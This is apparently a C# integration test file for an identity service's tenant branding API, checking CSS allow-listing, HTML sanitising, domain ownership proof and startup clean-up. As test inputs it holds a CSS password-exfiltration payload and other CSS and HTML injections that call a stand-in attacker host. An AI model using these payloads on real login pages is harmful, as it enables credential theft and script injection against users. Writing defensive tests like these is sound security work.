using System.Net;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Text.Json;
using IAM.API.Tests.Infrastructure;
using IAM.Core.Entities;
using IAM.Core.Services;
using IAM.Infrastructure.Data;
using IAM.Infrastructure.Services;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Mvc.Testing;
using Microsoft.AspNetCore.TestHost;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging.Abstractions;
using Xunit;

namespace IAM.API.Tests.Controllers;

/// <summary>
/// Task 5150: tenant branding is validated before it is stored (CSS allow-list, plain-text titles, sanitized e-mail
/// HTML, checked colors/URLs), re-checked on read and by a startup clean-up pass, a custom domain is only served after a
/// DNS TXT ownership proof and can never be a platform host, and the platform's own login host ignores ?tenant=.
/// </summary>
public class TenantBrandingSafetyTests : IClassFixture<IAMTestWebApplicationFactory>
{
    private const string ExfiltrationCss =
        "input[type=password][value^=a]{background:url(https://evil.example/a)} input[type=password][value^=b]{background:url(https://evil.example/b)}";

    private readonly IAMTestWebApplicationFactory _factory;

    public TenantBrandingSafetyTests(IAMTestWebApplicationFactory factory) => _factory = factory;

    // ----- helpers ---------------------------------------------------------------------------

    private sealed class FakeTxtResolver : ITxtRecordResolver
    {
        public Dictionary<string, string[]> Records { get; } = new(StringComparer.OrdinalIgnoreCase);
        public int Lookups { get; private set; }

        public Task<IReadOnlyList<string>> LookupAsync(string name, CancellationToken ct = default)
        {
            Lookups++;
            return Task.FromResult<IReadOnlyList<string>>(Records.TryGetValue(name, out var r) ? r : Array.Empty<string>());
        }
    }

    private async Task<(Guid Id, string Slug)> SeedTenantAsync()
    {
        using var scope = _factory.Services.CreateScope();
        var db = scope.ServiceProvider.GetRequiredService<IAMDbContext>();
        var slug = $"t{Guid.NewGuid():N}"[..12];
        var tenant = new Tenant { Id = Guid.NewGuid(), Name = $"Tenant {slug}", Slug = slug, IsActive = true };
        db.Tenants.Add(tenant);
        await db.SaveChangesAsync();
        return (tenant.Id, slug);
    }

    private HttpClient UserClient()
    {
        var client = _factory.CreateClient();
        var token = TestAuthenticationHelper.GenerateJwtToken(Guid.NewGuid(), "u@branding.test", new[] { "User" }, null);
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
        return client;
    }

    private static object Body(string? css = null, string? header = null, string? footer = null, string? title = null,
        string? subtitle = null, string? primary = "#4F46E5", string? logo = null, string? domain = null) => new
    {
        logoUrl = logo,
        primaryColor = primary,
        secondaryColor = "#7C3AED",
        backgroundUrl = (string?)null,
        customCss = css,
        emailHeaderHtml = header,
        emailFooterHtml = footer,
        faviconUrl = (string?)null,
        loginTitle = title,
        loginSubtitle = subtitle,
        whiteLabelEnabled = false,
        customDomain = domain
    };

    private async Task<TenantBranding?> RowAsync(Guid tenantId)
    {
        using var scope = _factory.Services.CreateScope();
        var db = scope.ServiceProvider.GetRequiredService<IAMDbContext>();
        return await db.TenantBrandings.AsNoTracking().FirstOrDefaultAsync(b => b.TenantId == tenantId);
    }

    /// <summary>Stores a row exactly as an old version of the API would have: raw, unvalidated.</summary>
    private async Task SeedRawBrandingAsync(Guid tenantId, Action<TenantBranding> configure)
    {
        using var scope = _factory.Services.CreateScope();
        var db = scope.ServiceProvider.GetRequiredService<IAMDbContext>();
        var branding = new TenantBranding { TenantId = tenantId };
        configure(branding);
        db.TenantBrandings.Add(branding);
        await db.SaveChangesAsync();
    }

    /// <summary>A host whose TXT lookups are fake, so ownership can be "published" without DNS.</summary>
    private (WebApplicationFactory<Program> Host, FakeTxtResolver Dns) HostWithFakeDns()
    {
        var dns = new FakeTxtResolver();
        var host = _factory.WithWebHostBuilder(builder => builder.ConfigureTestServices(services =>
        {
            var existing = services.Where(d => d.ServiceType == typeof(ITxtRecordResolver)).ToList();
            foreach (var d in existing)
                services.Remove(d);
            services.AddSingleton<ITxtRecordResolver>(dns);
        }));
        return (host, dns);
    }

    private static void Publish(WebApplicationFactory<Program> host, FakeTxtResolver dns, Guid tenantId, string domain)
    {
        var verifier = host.Services.GetRequiredService<IDomainOwnershipVerifier>();
        dns.Records[verifier.RecordName(domain)] = new[] { verifier.RecordValue(tenantId, domain) };
    }

    private static string UniqueDomain() => $"login-{Guid.NewGuid():N}"[..14] + ".example.com";

    // ----- saving: rejected --------------------------------------------------------------------

    [Fact]
    public async Task PasswordExfiltrationCss_IsRejectedWith400_AndNothingIsStored()
    {
        var (tenantId, _) = await SeedTenantAsync();

        var response = await UserClient().PutAsJsonAsync($"/api/branding/{tenantId}", Body(css: ExfiltrationCss));

        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        var json = await response.Content.ReadFromJsonAsync<JsonElement>();
        Assert.Contains("Custom CSS", json.GetProperty("error").GetString());
        Assert.True(json.GetProperty("errors").GetArrayLength() >= 1);
        Assert.Null(await RowAsync(tenantId));
    }

    [Theory]
    [InlineData("@import url(https://evil.example/x.css);")]
    [InlineData(".a{background:url(https://evil.example/x.png)}")]
    [InlineData(".a{background-image:image-set('x.png' 1x)}")]
    [InlineData(".a{width:expression(alert(1))}")]
    [InlineData(".a{background:u/**/rl(https://evil.example/x)}")]
    [InlineData(".a{background:\\75rl(x)}")]
    [InlineData("</style><script>alert(1)</script>")]
    public async Task UnsafeCss_Gets400(string css)
    {
        var (tenantId, _) = await SeedTenantAsync();

        var response = await UserClient().PutAsJsonAsync($"/api/branding/{tenantId}", Body(css: css));

        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        Assert.Null(await RowAsync(tenantId));
    }

    [Theory]
    [InlineData("<b>Welcome</b>")]
    [InlineData("<img src=x onerror=alert(1)>")]
    public async Task MarkupInLoginTitleOrSubtitle_Gets400(string text)
    {
        var (tenantId, _) = await SeedTenantAsync();
        var client = UserClient();

        Assert.Equal(HttpStatusCode.BadRequest, (await client.PutAsJsonAsync($"/api/branding/{tenantId}", Body(title: text))).StatusCode);
        Assert.Equal(HttpStatusCode.BadRequest, (await client.PutAsJsonAsync($"/api/branding/{tenantId}", Body(subtitle: text))).StatusCode);
        Assert.Null(await RowAsync(tenantId));
    }

    [Theory]
    [InlineData("red; background:url(x)", null)]
    [InlineData("#4F46E5", "javascript:alert(1)")]
    [InlineData("#4F46E5", "https://x.example/a.png');background:url(https://evil.example/y")]
    public async Task UnsafeColorOrLogoUrl_Gets400(string color, string? logo)
    {
        var (tenantId, _) = await SeedTenantAsync();

        var response = await UserClient().PutAsJsonAsync($"/api/branding/{tenantId}", Body(primary: color, logo: logo));

        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
    }

    // ----- saving: allowed / sanitized ------------------------------------------------------------

    [Fact]
    public async Task SafeBranding_IsSaved_AndEmailHtmlIsSanitizedBeforeItIsStored()
    {
        var (tenantId, _) = await SeedTenantAsync();
        var css = ".card{background-color:#fff;border-radius:8px} h1{color:#4F46E5;font-weight:700}";

        var response = await UserClient().PutAsJsonAsync($"/api/branding/{tenantId}", Body(
            css: css,
            header: "<p style=\"color:#333\">Acme</p><script>alert(1)</script><img src=\"https://acme.example/l.png\" onerror=\"alert(1)\">",
            footer: "<a href=\"javascript:alert(1)\">unsubscribe</a><iframe src=\"https://evil.example\"></iframe>",
            title: "Welcome to Acme", subtitle: "Sign in & get going", logo: "https://acme.example/l.png"));

        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        var row = (await RowAsync(tenantId))!;
        Assert.Equal(css, row.CustomCss);
        Assert.Equal("Welcome to Acme", row.LoginTitle);
        Assert.DoesNotContain("script", row.EmailHeaderHtml!, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onerror", row.EmailHeaderHtml!, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("<p style=\"color:#333\">Acme</p>", row.EmailHeaderHtml);
        Assert.DoesNotContain("javascript", row.EmailFooterHtml!, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("iframe", row.EmailFooterHtml!, StringComparison.OrdinalIgnoreCase);
    }

    // ----- custom domain ------------------------------------------------------------------------

    [Theory]
    [InlineData("localhost")]
    [InlineData("127.0.0.1")]
    [InlineData("https://login.acme.example")]
    [InlineData("login.acme.example/evil")]
    [InlineData("login.acme.example:8443")]
    public async Task ThePlatformHostOrANonHostName_CannotBeClaimedAsCustomDomain(string domain)
    {
        var (tenantId, _) = await SeedTenantAsync();

        var response = await UserClient().PutAsJsonAsync($"/api/branding/{tenantId}", Body(domain: domain));

        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        Assert.Null(await RowAsync(tenantId));
    }

    [Fact]
    public async Task ConfiguredPlatformHostAndTheIssuerHost_CannotBeClaimed()
    {
        var host = _factory.WithWebHostBuilder(builder => builder.ConfigureAppConfiguration((_, config) =>
            config.AddInMemoryCollection(new Dictionary<string, string?>
            {
                ["Branding:PlatformHosts:0"] = "iam.platform.example.com",
                ["Issuer"] = "https://issuer.platform.example.com",
            })));
        var (tenantId, _) = await SeedTenantAsync();
        var client = host.CreateClient();
        client.DefaultRequestHeaders.Authorization = UserClient().DefaultRequestHeaders.Authorization;

        var configured = await client.PutAsJsonAsync($"/api/branding/{tenantId}", Body(domain: "iam.platform.example.com"));
        var issuer = await client.PutAsJsonAsync($"/api/branding/{tenantId}", Body(domain: "issuer.platform.example.com"));

        Assert.Equal(HttpStatusCode.BadRequest, configured.StatusCode);
        Assert.Equal(HttpStatusCode.BadRequest, issuer.StatusCode);
    }

    [Fact]
    public async Task ADomainAlreadyClaimedByAnotherTenant_CannotBeClaimedAgain()
    {
        var (first, _) = await SeedTenantAsync();
        var (second, _) = await SeedTenantAsync();
        var domain = UniqueDomain();
        var client = UserClient();

        Assert.Equal(HttpStatusCode.OK, (await client.PutAsJsonAsync($"/api/branding/{first}", Body(domain: domain))).StatusCode);
        var again = await client.PutAsJsonAsync($"/api/branding/{second}", Body(domain: domain.ToUpperInvariant()));

        Assert.Equal(HttpStatusCode.BadRequest, again.StatusCode);
        Assert.Contains("already claimed", await again.Content.ReadAsStringAsync());
        Assert.Equal(domain, (await RowAsync(first))!.CustomDomain);
    }

    [Fact]
    public async Task ACustomDomain_IsNotServedByTheByDomainLookup_UntilTheDnsProofIsPublished()
    {
        var (host, dns) = HostWithFakeDns();
        var (tenantId, _) = await SeedTenantAsync();
        var domain = UniqueDomain();
        var client = host.CreateClient();
        client.DefaultRequestHeaders.Authorization = UserClient().DefaultRequestHeaders.Authorization;
        Assert.Equal(HttpStatusCode.OK, (await client.PutAsJsonAsync($"/api/branding/{tenantId}",
            Body(css: ".a{color:red}", title: "Acme Login", domain: domain))).StatusCode);

        // claimed but not proven: 404, and the verification page shows what to publish
        Assert.Equal(HttpStatusCode.NotFound, (await client.GetAsync($"/api/branding/by-domain/{domain}")).StatusCode);
        var instructions = await (await client.GetAsync($"/api/branding/{tenantId}/domain-verification")).Content.ReadFromJsonAsync<JsonElement>();
        Assert.False(instructions.GetProperty("verified").GetBoolean());
        Assert.Equal($"_iam-verify.{domain}", instructions.GetProperty("recordName").GetString());
        Assert.StartsWith("iam-verify=", instructions.GetProperty("recordValue").GetString());

        // someone else's proof does not count: the record for another tenant on the same domain
        var verifier = host.Services.GetRequiredService<IDomainOwnershipVerifier>();
        dns.Records[verifier.RecordName(domain)] = new[] { verifier.RecordValue(Guid.NewGuid(), domain) };
        Assert.Equal(HttpStatusCode.NotFound, (await client.GetAsync($"/api/branding/by-domain/{domain}")).StatusCode);
    }

    [Fact]
    public async Task ACustomDomain_IsServedAfterTheDnsProofIsPublished_WithSafeFieldsOnly()
    {
        var (host, dns) = HostWithFakeDns();
        var (tenantId, slug) = await SeedTenantAsync();
        var domain = UniqueDomain();
        // A row stored by an old version: raw CSS, markup in the title, an unsafe logo URL
        await SeedRawBrandingAsync(tenantId, b =>
        {
            b.CustomDomain = domain;
            b.CustomCss = ExfiltrationCss;
            b.LoginTitle = "<img src=x onerror=alert(1)>Welcome";
            b.LoginSubtitle = "Sign in";
            b.LogoUrl = "javascript:alert(1)";
            b.PrimaryColor = "red;background:url(x)";
            b.EmailHeaderHtml = "<script>alert(1)</script>";
        });
        Publish(host, dns, tenantId, domain);

        var response = await host.CreateClient().GetAsync($"/api/branding/by-domain/{domain}");

        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        var body = await response.Content.ReadAsStringAsync();
        var json = JsonDocument.Parse(body).RootElement;
        Assert.Equal(slug, json.GetProperty("tenantSlug").GetString());
        Assert.Equal(JsonValueKind.Null, json.GetProperty("customCss").ValueKind);
        Assert.Equal(JsonValueKind.Null, json.GetProperty("logoUrl").ValueKind);
        Assert.Equal("#4F46E5", json.GetProperty("primaryColor").GetString());
        Assert.DoesNotContain("<", json.GetProperty("loginTitle").GetString());
        Assert.DoesNotContain("evil", body);
        Assert.DoesNotContain("emailHeaderHtml", body);
    }

    [Fact]
    public async Task ByDomain_NeverServesAPlatformHost_EvenIfARowClaimsIt()
    {
        var (host, dns) = HostWithFakeDns();
        var (tenantId, _) = await SeedTenantAsync();
        // an old row that already claims the platform's own host name (stored before this fix)
        await SeedRawBrandingAsync(tenantId, b => b.CustomDomain = "localhost");
        dns.Records["_iam-verify.localhost"] = new[] { host.Services.GetRequiredService<IDomainOwnershipVerifier>().RecordValue(tenantId, "localhost") };

        var response = await host.CreateClient().GetAsync("/api/branding/by-domain/localhost");

        Assert.Equal(HttpStatusCode.NotFound, response.StatusCode);
    }

    // ----- ?tenant= on the platform host -------------------------------------------------------------

    [Fact]
    public async Task OnThePlatformHost_TheTenantSlugIsIgnored_EvenForAVerifiedTenantWithBranding()
    {
        var (host, dns) = HostWithFakeDns();
        var (tenantId, slug) = await SeedTenantAsync();
        var domain = UniqueDomain();
        await SeedRawBrandingAsync(tenantId, b =>
        {
            b.CustomDomain = domain;
            b.CustomCss = ".a{color:red}";
            b.LoginTitle = "Phish";
        });
        Publish(host, dns, tenantId, domain);

        // the test server is reached as "localhost", a platform host
        var response = await host.CreateClient().GetAsync($"/api/branding/public/{slug}");

        Assert.Equal(HttpStatusCode.NotFound, response.StatusCode);
        Assert.DoesNotContain("Phish", await response.Content.ReadAsStringAsync());
    }

    [Fact]
    public async Task OnATenantsOwnVerifiedDomain_ItsOwnSlugWorks_AndAnotherTenantsSlugDoesNot()
    {
        var (host, dns) = HostWithFakeDns();
        var (mine, mySlug) = await SeedTenantAsync();
        var (other, otherSlug) = await SeedTenantAsync();
        var domain = UniqueDomain();
        await SeedRawBrandingAsync(mine, b => { b.CustomDomain = domain; b.LoginTitle = "Mine"; });
        await SeedRawBrandingAsync(other, b => { b.CustomDomain = UniqueDomain(); b.LoginTitle = "Other"; });
        Publish(host, dns, mine, domain);
        var client = host.CreateClient();
        client.BaseAddress = new Uri($"https://{domain}");

        var own = await client.GetAsync($"/api/branding/public/{mySlug}");
        var foreign = await client.GetAsync($"/api/branding/public/{otherSlug}");

        Assert.Equal(HttpStatusCode.OK, own.StatusCode);
        Assert.Equal("Mine", (await own.Content.ReadFromJsonAsync<JsonElement>()).GetProperty("loginTitle").GetString());
        Assert.Equal(HttpStatusCode.NotFound, foreign.StatusCode);
    }

    // ----- startup clean-up of stored rows ------------------------------------------------------------

    [Fact]
    public async Task StartupCleanup_RemovesUnsafeStoredBranding_AndLeavesCleanRowsAlone()
    {
        using var scope = _factory.Services.CreateScope();
        var db = scope.ServiceProvider.GetRequiredService<IAMDbContext>();
        var (dirtyId, _) = await SeedTenantAsync();
        var (cleanId, _) = await SeedTenantAsync();
        await SeedRawBrandingAsync(dirtyId, b =>
        {
            b.CustomCss = ExfiltrationCss;
            b.EmailHeaderHtml = "<p>ok</p><script>alert(1)</script>";
            b.EmailFooterHtml = "<a href=\"javascript:alert(1)\">x</a>";
            b.LoginTitle = "<b>Hi</b>";
            b.LogoUrl = "javascript:alert(1)";
            b.PrimaryColor = "red; background:url(x)";
            b.CustomDomain = "HTTPS://Bad Domain";
        });
        await SeedRawBrandingAsync(cleanId, b =>
        {
            b.CustomCss = ".a{color:red}";
            b.EmailHeaderHtml = "<p>ok</p>";
            b.LoginTitle = "Welcome";
            b.PrimaryColor = "#4F46E5";
            b.CustomDomain = "login.clean.example.com";
        });
        var cleanBefore = (await RowAsync(cleanId))!.UpdatedAt;

        var changed = await BrandingCleanup.RunAsync(db, NullLogger.Instance);
        var again = await BrandingCleanup.RunAsync(db, NullLogger.Instance);

        Assert.True(changed >= 1);
        Assert.Equal(0, again);
        var dirty = (await RowAsync(dirtyId))!;
        Assert.Null(dirty.CustomCss);
        Assert.Equal("<p>ok</p>", dirty.EmailHeaderHtml);
        Assert.DoesNotContain("javascript", dirty.EmailFooterHtml ?? string.Empty, StringComparison.OrdinalIgnoreCase);
        Assert.Equal("Hi", dirty.LoginTitle);
        Assert.Null(dirty.LogoUrl);
        Assert.Null(dirty.PrimaryColor);
        Assert.Null(dirty.CustomDomain);
        var clean = (await RowAsync(cleanId))!;
        Assert.Equal(".a{color:red}", clean.CustomCss);
        Assert.Equal("login.clean.example.com", clean.CustomDomain);
        Assert.Equal(cleanBefore, clean.UpdatedAt);
    }
}
